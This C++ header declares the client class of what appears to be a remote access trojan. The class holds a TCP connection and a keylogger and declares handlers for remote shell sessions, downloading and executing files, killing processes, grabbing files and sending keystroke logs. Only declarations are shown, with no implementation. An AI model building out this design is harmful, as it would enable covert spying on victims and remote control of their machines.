#pragma once

#include "Connection.h"
#include "Packet.h"
#include "Xor.h"
#include "Keylogger.h"

#include <map>

class Client
{
#define RETRY_DELAY 5000 // retry delay in ms

private:
	TCPConnection m_connection;
	Keylogger m_keylogger;

public:
	explicit Client(const char *ip, uint16_t port);
	virtual ~Client();

	void ShowMsg(void *param);
	void DownloadFile(void *param);
	void Execute(void *param);
	void Kill(void *param);
	void ShellSession(void * aram);
	void GetFile(void *param);
	void Auth(void *param);
	void Info(void * param);
	void SendLogs(void * param);
	void Pong(void * param);

	void Start();
};

